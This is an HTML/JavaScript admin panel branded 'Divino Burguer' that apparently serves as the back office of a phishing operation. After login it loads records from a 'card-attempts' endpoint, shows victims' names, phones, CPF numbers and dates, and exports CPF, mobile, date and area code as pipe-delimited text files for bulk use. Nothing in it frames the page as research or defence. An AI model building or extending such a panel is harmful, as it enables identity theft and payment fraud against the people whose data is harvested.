<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Admin - Divino Burguer</title>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      min-height: 100vh;
      font-family: Arial, Helvetica, sans-serif;
      background: #fffaf6;
      color: #191919;
    }
    header {
      background: #fff;
      border-bottom: 1px solid #e8e0dc;
    }
    .bar, main {
      width: min(1040px, calc(100% - 32px));
      margin: 0 auto;
    }
    .bar {
      min-height: 70px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 16px;
    }
    h1 {
      margin: 0;
      font-size: 22px;
      line-height: 1.2;
    }
    main {
      padding: 28px 0 44px;
    }
    .panel {
      background: #fff;
      border: 1px solid #e8e0dc;
      border-radius: 8px;
      padding: 20px;
    }
    form {
      display: grid;
      gap: 12px;
      max-width: 380px;
    }
    label {
      display: grid;
      gap: 6px;
      font-size: 13px;
      font-weight: 800;
    }
    input {
      min-height: 44px;
      border: 1px solid #d8ceca;
      border-radius: 6px;
      padding: 10px 12px;
      font: inherit;
    }
    button {
      min-height: 44px;
      border: 0;
      border-radius: 6px;
      padding: 0 14px;
      background: #d02122;
      color: #fff;
      font: inherit;
      font-weight: 800;
      cursor: pointer;
    }
    button.secondary {
      background: #191919;
    }
    .actions {
      display: flex;
      gap: 10px;
      flex-wrap: wrap;
      margin-bottom: 16px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      background: #fff;
    }
    th, td {
      padding: 12px 10px;
      border-bottom: 1px solid #e8e0dc;
      text-align: left;
      font-size: 14px;
    }
    th {
      font-size: 12px;
      text-transform: uppercase;
      color: #676767;
    }
    .muted {
      color: #676767;
      font-size: 14px;
    }
    .error {
      color: #a31919;
      font-weight: 800;
    }
    [hidden] { display: none !important; }
    @media (max-width: 720px) {
      table, thead, tbody, th, td, tr { display: block; }
      thead { display: none; }
      tr {
        border: 1px solid #e8e0dc;
        border-radius: 8px;
        margin-bottom: 10px;
        padding: 8px;
      }
      td {
        border: 0;
        padding: 7px 4px;
      }
      td::before {
        content: attr(data-label);
        display: block;
        margin-bottom: 2px;
        color: #676767;
        font-size: 12px;
        font-weight: 800;
        text-transform: uppercase;
      }
    }
  </style>
</head>
<body>
  <header>
    <div class="bar">
      <h1>Divino Burguer Admin</h1>
      <span class="muted">Painel protegido</span>
    </div>
  </header>

  <main>
    <section id="login-panel" class="panel">
      <h2>Entrar</h2>
      <form id="login-form">
        <label>Email<input name="email" type="email" autocomplete="username" required></label>
        <label>Senha<input name="password" type="password" autocomplete="current-password" required></label>
        <button type="submit">Entrar</button>
        <div id="login-error" class="error" hidden></div>
      </form>
    </section>

    <section id="cards-panel" class="panel" hidden>
      <div class="actions">
        <button type="button" class="secondary" id="refresh">Atualizar</button>
        <button type="button" class="secondary" id="export-txt" disabled>Exportar TXT</button>
        <button type="button" class="secondary" id="clear-list" disabled>Limpar lista</button>
        <button type="button" class="secondary" id="logout">Sair</button>
      </div>
      <div id="cards"></div>
    </section>
  </main>

  <script>
    const loginPanel = document.getElementById('login-panel');
    const cardsPanel = document.getElementById('cards-panel');
    const cardsBox = document.getElementById('cards');
    const loginError = document.getElementById('login-error');
    const exportButton = document.getElementById('export-txt');
    const clearButton = document.getElementById('clear-list');
    let cardRecords = [];

    function escapeHtml(value) {
      return String(value ?? '').replace(/[&<>"']/g, (char) => ({
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#39;'
      }[char]));
    }

    async function renderCards() {
      cardsBox.innerHTML = '<p class="muted">Carregando...</p>';
      exportButton.disabled = true;
      clearButton.disabled = true;
      const response = await fetch('/api/admin/card-attempts', {
        credentials: 'same-origin'
      });
      const payload = await response.json().catch(() => ({}));
      if (!response.ok) {
        throw new Error(payload.message || 'Nao foi possivel carregar os dados.');
      }

      const cards = payload.records || [];
      cardRecords = cards;
      exportButton.disabled = cards.length === 0;
      clearButton.disabled = cards.length === 0;
      if (!cards.length) {
        cardsBox.innerHTML = '<p class="muted">Nenhum registro encontrado.</p>';
        return;
      }

      cardsBox.innerHTML = `
        <table>
          <thead>
            <tr>
              <th>Data</th>
              <th>Telefone</th>
              <th>Nome</th>
              <th>CPF</th>
              <th>Celular</th>
              <th>Data</th>
              <th>DDD</th>
            </tr>
          </thead>
          <tbody>
            ${cards.map((card) => `
              <tr>
                <td data-label="Data">${new Date(card.created_at).toLocaleString('pt-BR')}</td>
                <td data-label="Telefone">${escapeHtml(card.phone || '-')}</td>
                <td data-label="Nome">${escapeHtml(card.first_name || '-')}</td>
                <td data-label="CPF">${escapeHtml(card.cpf || '-')}</td>
                <td data-label="Celular">${escapeHtml(card.celular || '-')}</td>
                <td data-label="Data">${escapeHtml(card.data || '-')}</td>
                <td data-label="DDD">${escapeHtml(card.ddd || '-')}</td>
              </tr>
            `).join('')}
          </tbody>
        </table>
      `;
    }

    function exportValue(value) {
      return String(value ?? '').replace(/[|\r\n]+/g, ' ').trim();
    }

    function exportTxt() {
      if (!cardRecords.length) return;

      const text = cardRecords.map((card) => [
        card.cpf,
        card.celular,
        card.data,
        card.ddd
      ].map(exportValue).join('|')).join('\r\n');
      const file = new Blob([text], { type: 'text/plain;charset=utf-8' });
      const url = URL.createObjectURL(file);
      const link = document.createElement('a');
      link.href = url;
      link.download = `clientes-${new Date().toISOString().slice(0, 10)}.txt`;
      document.body.appendChild(link);
      link.click();
      link.remove();
      URL.revokeObjectURL(url);
    }

    function updateView(authenticated) {
      loginPanel.hidden = authenticated;
      cardsPanel.hidden = !authenticated;
      if (authenticated) {
        renderCards().catch((error) => {
          cardsBox.innerHTML = `<p class="error">${escapeHtml(error.message)}</p>`;
        });
      }
    }

    async function clearCards() {
      if (!cardRecords.length) return;
      if (!window.confirm('Tem certeza que deseja limpar todos os registros da lista?')) return;

      clearButton.disabled = true;
      try {
        const response = await fetch('/api/admin/card-attempts', {
          method: 'DELETE',
          credentials: 'same-origin'
        });
        const payload = await response.json().catch(() => ({}));
        if (!response.ok) {
          throw new Error(payload.message || 'Nao foi possivel limpar a lista.');
        }
      } catch (error) {
        clearButton.disabled = false;
        throw error;
      }

      cardRecords = [];
      exportButton.disabled = true;
      clearButton.disabled = true;
      cardsBox.innerHTML = '<p class="muted">Nenhum registro encontrado.</p>';
    }

    document.getElementById('login-form').addEventListener('submit', async (event) => {
      event.preventDefault();
      const form = event.currentTarget;
      const data = new FormData(form);
      const submit = form.querySelector('button[type="submit"]');
      submit.disabled = true;
      loginError.hidden = true;

      try {
        const response = await fetch('/api/admin/login', {
          method: 'POST',
          credentials: 'same-origin',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            email: data.get('email'),
            password: data.get('password')
          })
        });
        const payload = await response.json().catch(() => ({}));
        if (!response.ok) {
          throw new Error(payload.message || 'Nao foi possivel entrar.');
        }

        form.reset();
        loginError.hidden = true;
        updateView(true);
      } catch (error) {
        loginError.textContent = error.message;
        loginError.hidden = false;
      } finally {
        submit.disabled = false;
      }
    });

    document.getElementById('refresh').addEventListener('click', () => {
      renderCards().catch((error) => {
        cardsBox.innerHTML = `<p class="error">${escapeHtml(error.message)}</p>`;
      });
    });
    exportButton.addEventListener('click', exportTxt);
    clearButton.addEventListener('click', () => {
      clearCards().catch((error) => {
        cardsBox.innerHTML = `<p class="error">${escapeHtml(error.message)}</p>`;
      });
    });
    document.getElementById('logout').addEventListener('click', async () => {
      await fetch('/api/admin/logout', {
        method: 'POST',
        credentials: 'same-origin'
      }).catch(() => null);
      cardRecords = [];
      exportButton.disabled = true;
      clearButton.disabled = true;
      updateView(false);
    });

    fetch('/api/admin/session', {
      credentials: 'same-origin'
    }).then((response) => updateView(response.ok)).catch(() => updateView(false));
  </script>
</body>
</html>
